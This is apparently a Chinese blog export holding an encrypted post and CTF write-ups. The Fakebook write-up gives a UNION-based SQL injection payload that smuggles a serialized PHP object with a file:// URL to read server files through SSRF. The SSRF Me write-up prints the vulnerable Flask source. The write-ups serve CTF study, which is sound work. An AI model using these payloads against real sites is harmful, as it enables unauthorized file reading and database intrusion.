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</div>
<div id="enc_passwd"> <input id="enc_pwd_input" type="password" style="border-radius: 5px;border-style: groove;height: 30px;width: 50%;cursor: auto;font-size: 102%;color: currentColor;outline: none;text-overflow: initial;padding-left: 5px;" onkeydown="if (event.keyCode == 13) { decrypt(); return false;}"> <input type="submit" value="解&nbsp;密" onclick="decrypt()" style="width: 58px;height: 34px;border-radius: 5px;background-color: white;border-style: solid;color: currentColor;"><div id="enc_error" style="display: inline-block;color: #d84527;margin-left: 10px"></div>
<script>
var onError = function(error) {
	document.getElementById("enc_error").innerHTML = "password error!"
};
function decrypt() {
var passwd = document.getElementById("enc_pwd_input").value;
console.log(passwd);
doDecrypt(passwd, onError);
}
</script>
</div>]]></content>
      <categories>
        <category>随笔</category>
      </categories>
      <tags>
        <tag>总结</tag>
      </tags>
  </entry>
  <entry>
    <title>buuoj刷题记录5</title>
    <url>/2019/12/30/buuoj%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%955/</url>
    <content><![CDATA[<h2 id="网鼎杯-2018-Fakebook"><a href="#网鼎杯-2018-Fakebook" class="headerlink" title="[网鼎杯 2018]Fakebook"></a>[网鼎杯 2018]Fakebook</h2><h3 id="0x00-基础"><a href="#0x00-基础" class="headerlink" title="0x00 基础"></a>0x00 基础</h3><p>一般文件的目录又xxx.php.bak/swp，或者查看元素、robots.txt里面有提示，或者<code>www.zip</code>等一系列文件中出现网站源码。也可以使用工具扫描</p>
<a id="more"></a>

<h3 id="0x01-分析"><a href="#0x01-分析" class="headerlink" title="0x01 分析"></a>0x01 分析</h3><p>访问<code>robots.txt</code>，给了一个提示</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">User-agent: *</span><br><span class="line">Disallow: &#x2F;user.php.bak</span><br></pre></td></tr></table></figure>

<p>拿到<code>user.php</code>的源码</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">class UserInfo</span><br><span class="line">&#123;</span><br><span class="line">    public $name &#x3D; &quot;&quot;;</span><br><span class="line">    public $age &#x3D; 0;</span><br><span class="line">    public $blog &#x3D; &quot;&quot;;</span><br><span class="line"></span><br><span class="line">    public function __construct($name, $age, $blog)</span><br><span class="line">    &#123;</span><br><span class="line">        $this-&gt;name &#x3D; $name;</span><br><span class="line">        $this-&gt;age &#x3D; (int)$age;</span><br><span class="line">        $this-&gt;blog &#x3D; $blog;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function get($url)</span><br><span class="line">    &#123;</span><br><span class="line">        $ch &#x3D; curl_init();   &#x2F;&#x2F;初始化链接</span><br><span class="line"></span><br><span class="line">        curl_setopt($ch, CURLOPT_URL, $url);     &#x2F;&#x2F;设置CURLOPT_URL</span><br><span class="line">        curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);   &#x2F;&#x2F;将curl_exec()获取的信息以文件流的形式返回,而不是直接输出</span><br><span class="line">        $output &#x3D; curl_exec($ch);      &#x2F;执行CURL会话;此处存在ssrf</span><br><span class="line">        $httpCode &#x3D; curl_getinfo($ch, CURLINFO_HTTP_CODE);</span><br><span class="line">        if($httpCode &#x3D;&#x3D; 404) &#123;</span><br><span class="line">            return 404;</span><br><span class="line">        &#125;</span><br><span class="line">        curl_close($ch);</span><br><span class="line"></span><br><span class="line">        return $output;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    public function getBlogContents ()</span><br><span class="line">    &#123;</span><br><span class="line">        return $this-&gt;get($this-&gt;blog);  &#x2F;&#x2F;获取博客地址</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    public function isValidBlog ()</span><br><span class="line">    &#123;</span><br><span class="line">        $blog &#x3D; $this-&gt;blog;</span><br><span class="line">        return preg_match(&quot;&#x2F;^(((http(s?))\:\&#x2F;\&#x2F;)?)([0-9a-zA-Z\-]+\.)+[a-zA-Z]&#123;2,6&#125;(\:[0-9]+)?(\&#x2F;\S*)?$&#x2F;i&quot;, $blog);  &#x2F;&#x2F;博客地址有过滤</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>访问<code>flag.php</code>，显示返回是200。那么应该是要将<code>./flag.php</code>写入博客地址，让程序加载。</p>
<p>在加入一个用户时的<code>username</code>存在post注入，加入完成，进入到<code>view.php</code>发现也存在注入</p>
<h3 id="0x02-开始操作"><a href="#0x02-开始操作" class="headerlink" title="0x02 开始操作"></a>0x02 开始操作</h3><p>使用sqlmap跑了一遍post注入，发现数据库中存的是序列化后结果，应该存在序列化漏洞。</p>
<p><img src="../pic/4.png" alt=""></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">payload&#x3D;view.php?no&#x3D;0&#x2F;**&#x2F;union&#x2F;**&#x2F;select&#x2F;**&#x2F;1,2,3,&#39;O:8:&quot;UserInfo&quot;:3&#123;s:4:&quot;name&quot;;s:4:&quot;and&quot;;s:3:&quot;age&quot;;i:12;s:4:&quot;blog&quot;;s:29:&quot;file:&#x2F;&#x2F;&#x2F;var&#x2F;www&#x2F;html&#x2F;flag.php&quot;;&#125;&#39;</span><br></pre></td></tr></table></figure>

<p>执行结果</p>
<p><img src="../pic/5.png" alt=""></p>
<p>查看源码</p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;!doctype <span class="meta-keyword">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span> <span class="attr">lang</span>=<span class="string">"ko"</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">meta</span> <span class="attr">charset</span>=<span class="string">"UTF-8"</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">meta</span> <span class="attr">name</span>=<span class="string">"viewport"</span></span></span><br><span class="line"><span class="tag">          <span class="attr">content</span>=<span class="string">"width=device-width, user-scalable=no, initial-scale=1.0, maximum-scale=1.0, minimum-scale=1.0"</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">meta</span> <span class="attr">http-equiv</span>=<span class="string">"X-UA-Compatible"</span> <span class="attr">content</span>=<span class="string">"ie=edge"</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">title</span>&gt;</span>User<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line"></span><br><span class="line">    <span class="tag">&lt;<span class="name">link</span> <span class="attr">rel</span>=<span class="string">"stylesheet"</span> <span class="attr">href</span>=<span class="string">"css/bootstrap.min.css"</span> <span class="attr">crossorigin</span>=<span class="string">"anonymous"</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">src</span>=<span class="string">"js/jquery-3.3.1.slim.min.js"</span> <span class="attr">crossorigin</span>=<span class="string">"anonymous"</span>&gt;</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">src</span>=<span class="string">"js/popper.min.js"</span> <span class="attr">crossorigin</span>=<span class="string">"anonymous"</span>&gt;</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">src</span>=<span class="string">"js/bootstrap.min.js"</span> <span class="attr">crossorigin</span>=<span class="string">"anonymous"</span>&gt;</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"container"</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">table</span> <span class="attr">class</span>=<span class="string">"table"</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">tr</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">th</span>&gt;</span></span><br><span class="line">                username</span><br><span class="line">            <span class="tag">&lt;/<span class="name">th</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">th</span>&gt;</span></span><br><span class="line">                age</span><br><span class="line">            <span class="tag">&lt;/<span class="name">th</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">th</span>&gt;</span></span><br><span class="line">                blog</span><br><span class="line">            <span class="tag">&lt;/<span class="name">th</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">tr</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">tr</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">td</span>&gt;</span></span><br><span class="line">                2            <span class="tag">&lt;/<span class="name">td</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">td</span>&gt;</span></span><br><span class="line">                12            <span class="tag">&lt;/<span class="name">td</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">td</span>&gt;</span></span><br><span class="line">                file:///var/www/html/flag.php            <span class="tag">&lt;/<span class="name">td</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">tr</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">table</span>&gt;</span></span><br><span class="line"></span><br><span class="line">    <span class="tag">&lt;<span class="name">hr</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">br</span>&gt;</span><span class="tag">&lt;<span class="name">br</span>&gt;</span><span class="tag">&lt;<span class="name">br</span>&gt;</span><span class="tag">&lt;<span class="name">br</span>&gt;</span><span class="tag">&lt;<span class="name">br</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">p</span>&gt;</span>the contents of his/her blog<span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">hr</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">iframe</span> <span class="attr">width</span>=<span class="string">'100%'</span> <span class="attr">height</span>=<span class="string">'10em'</span> <span class="attr">src</span>=<span class="string">'data:text/html;base64,PD9waHANCg0KJGZsYWcgPSAiZmxhZ3s4MzUwNjViNi1iNjBkLTQ5ZGEtYTkyYi1kZDgwZDM4MDMyZGN9IjsNCmV4aXQoMCk7DQo='</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p>点击即可看见flag</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line">$flag = <span class="string">"flag&#123;835065b6-b60d-49da-a92b-dd80d38032dc&#125;"</span>;</span><br><span class="line"><span class="keyword">exit</span>(<span class="number">0</span>);</span><br></pre></td></tr></table></figure>

]]></content>
      <categories>
        <category>刷题记录</category>
      </categories>
      <tags>
        <tag>web</tag>
        <tag>buuctf</tag>
        <tag>网鼎杯2018</tag>
      </tags>
  </entry>
  <entry>
    <title>buuoj刷题记录4</title>
    <url>/2019/12/28/buuoj%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%954/</url>
    <content><![CDATA[<h2 id="De1CTF-2019-SSRF-Me"><a href="#De1CTF-2019-SSRF-Me" class="headerlink" title="[De1CTF 2019]SSRF Me"></a>[De1CTF 2019]SSRF Me</h2><h3 id="0x00-基础"><a href="#0x00-基础" class="headerlink" title="0x00 基础"></a>0x00 基础</h3><p>大致了解flask框架，<a href="http://www.security-database.com/detail.php?alert=CVE-2019-9948" target="_blank" rel="noopener">CVE-2019-9948</a>：<code>urlopen（）可包含本地文件</code>，<a href="https://www.freebuf.com/articles/web/31756.html" target="_blank" rel="noopener">哈希长度扩展攻击</a> 。</p>
<a id="more"></a>

<h3 id="0x01-分析"><a href="#0x01-分析" class="headerlink" title="0x01 分析"></a>0x01 分析</h3><p>题目提示 <code>flag在./flag.txt中</code>。</p>
<p>打开链接查看源码，在buuoj的复现过程中，查看源码只拿到一行，需要自己一个一个的敲回车改格式。</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#! /usr/bin/env python</span></span><br><span class="line"><span class="comment">#encoding=utf-8</span></span><br><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> Flask</span><br><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> request</span><br><span class="line"><span class="keyword">import</span> socket</span><br><span class="line"><span class="keyword">import</span> hashlib</span><br><span class="line"><span class="keyword">import</span> urllib</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">import</span> json</span><br><span class="line"></span><br><span class="line">reload(sys)</span><br><span class="line">sys.setdefaultencoding(<span class="string">'latin1'</span>)</span><br><span class="line"></span><br><span class="line">app = Flask(__name__)</span><br><span class="line"></span><br><span class="line">secert_key = os.urandom(<span class="number">16</span>)</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Task</span>:</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__init__</span><span class="params">(self, action, param, sign, ip)</span>:</span></span><br><span class="line">        self.action = action</span><br><span class="line">        self.param = param</span><br><span class="line">        self.sign = sign</span><br><span class="line">        self.sandbox = md5(ip)</span><br><span class="line">        <span class="keyword">if</span>(<span class="keyword">not</span> os.path.exists(self.sandbox)):          <span class="comment">#SandBox For Remote_Addr</span></span><br><span class="line">            os.mkdir(self.sandbox)</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">Exec</span><span class="params">(self)</span>:</span></span><br><span class="line">        result = &#123;&#125;</span><br><span class="line">        result[<span class="string">'code'</span>] = <span class="number">500</span></span><br><span class="line">        <span class="keyword">if</span> (self.checkSign()):</span><br><span class="line">            <span class="keyword">if</span> <span class="string">"scan"</span> <span class="keyword">in</span> self.action:</span><br><span class="line">                tmpfile = open(<span class="string">"./%s/result.txt"</span> % self.sandbox, <span class="string">'w'</span>)</span><br><span class="line">                resp = scan(self.param)</span><br><span class="line">                <span class="keyword">if</span> (resp == <span class="string">"Connection Timeout"</span>):</span><br><span class="line">                    result[<span class="string">'data'</span>] = resp</span><br><span class="line">                <span class="keyword">else</span>:</span><br><span class="line">                    print(resp)</span><br><span class="line">                    tmpfile.write(resp)</span><br><span class="line">                    tmpfile.close()</span><br><span class="line">                result[<span class="string">'code'</span>] = <span class="number">200</span></span><br><span class="line">            <span class="keyword">if</span> <span class="string">"read"</span> <span class="keyword">in</span> self.action:</span><br><span class="line">                f = open(<span class="string">"./%s/result.txt"</span> % self.sandbox, <span class="string">'r'</span>)</span><br><span class="line">                result[<span class="string">'code'</span>] = <span class="number">200</span></span><br><span class="line">                result[<span class="string">'data'</span>] = f.read()</span><br><span class="line">            <span class="keyword">if</span> result[<span class="string">'code'</span>] == <span class="number">500</span>:</span><br><span class="line">                result[<span class="string">'data'</span>] = <span class="string">"Action Error"</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            result[<span class="string">'code'</span>] = <span class="number">500</span></span><br><span class="line">            result[<span class="string">'msg'</span>] = <span class="string">"Sign Error"</span></span><br><span class="line">        <span class="keyword">return</span> result</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">checkSign</span><span class="params">(self)</span>:</span></span><br><span class="line">        <span class="keyword">if</span> (getSign(self.action, self.param) == self.sign):  <span class="comment">#对secert_key、param、action进行MD5运算  的结果与self.sign作比较</span></span><br><span class="line">            <span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#generate Sign For Action Scan.</span></span><br><span class="line"><span class="meta">@app.route("/geneSign", methods=['GET', 'POST'])</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">geneSign</span><span class="params">()</span>:</span></span><br><span class="line">    param = urllib.unquote(request.args.get(<span class="string">"param"</span>, <span class="string">""</span>))  <span class="comment"># urllib.unquote 相当与  urldecode</span></span><br><span class="line">    action = <span class="string">"scan"</span></span><br><span class="line">    <span class="keyword">return</span> getSign(action, param)</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route('/De1ta',methods=['GET','POST'])</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">challenge</span><span class="params">()</span>:</span></span><br><span class="line">    action = urllib.unquote(request.cookies.get(<span class="string">"action"</span>))</span><br><span class="line">    param = urllib.unquote(request.args.get(<span class="string">"param"</span>, <span class="string">""</span>))</span><br><span class="line">    sign = urllib.unquote(request.cookies.get(<span class="string">"sign"</span>))</span><br><span class="line">    ip = request.remote_addr</span><br><span class="line">    <span class="keyword">if</span>(waf(param)):</span><br><span class="line">        <span class="keyword">return</span> <span class="string">"No Hacker!!!!"</span></span><br><span class="line">    task = Task(action, param, sign, ip)</span><br><span class="line">    <span class="keyword">return</span> json.dumps(task.Exec())</span><br><span class="line"><span class="meta">@app.route('/')</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">index</span><span class="params">()</span>:</span></span><br><span class="line">    <span class="keyword">return</span> open(<span class="string">"code.txt"</span>,<span class="string">"r"</span>).read()</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">scan</span><span class="params">(param)</span>:</span></span><br><span class="line">    socket.setdefaulttimeout(<span class="number">1</span>)</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        <span class="keyword">return</span> urllib.urlopen(param).read()[:<span class="number">50</span>]</span><br><span class="line">    <span class="keyword">except</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">"Connection Timeout"</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">getSign</span><span class="params">(action, param)</span>:</span></span><br><span class="line">    <span class="keyword">return</span> hashlib.md5(secert_key + param + action).hexdigest() <span class="comment">#对secert_key、param、action进行MD5摘要签名</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">md5</span><span class="params">(content)</span>:</span></span><br><span class="line">    <span class="keyword">return</span> hashlib.md5(content).hexdigest()</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">waf</span><span class="params">(param)</span>:</span></span><br><span class="line">    check=param.strip().lower()</span><br><span class="line">    <span class="keyword">if</span> check.startswith(<span class="string">"gopher"</span>) <span class="keyword">or</span> check.startswith(<span class="string">"file"</span>):</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</span><br><span class="line">    app.debug = <span class="literal">False</span></span><br><span class="line">    app.run(host=<span class="string">'0.0.0.0'</span>,port=<span class="number">80</span>)</span><br></pre></td></tr></table></figure>

<p>分析代码，总共三条路由，<code>@app.route(&#39;/&#39;)</code>显示代码，<code>@app.route(&quot;/geneSign&quot;, methods=[&#39;GET&#39;, &#39;POST&#39;])</code>生成签名，<code>@app.route(&#39;/De1ta&#39;,methods=[&#39;GET&#39;,&#39;POST&#39;])</code>获取参数并执行<code>Exec()</code>函数</p>
